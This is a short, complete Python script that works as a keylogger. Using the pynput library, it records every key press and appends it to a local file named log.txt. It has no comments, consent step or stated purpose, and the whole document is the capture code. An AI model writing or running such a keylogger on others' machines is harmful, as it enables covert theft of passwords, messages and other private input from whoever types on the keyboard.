#!/usr/bin/env python3
from pynput.keyboard import Listener

def log( key ):
    with open( "./log.txt", "a" ) as f:
        f.write( str( key ).replace( "'","" ) )

with Listener( on_press=log ) as l:
    l.join()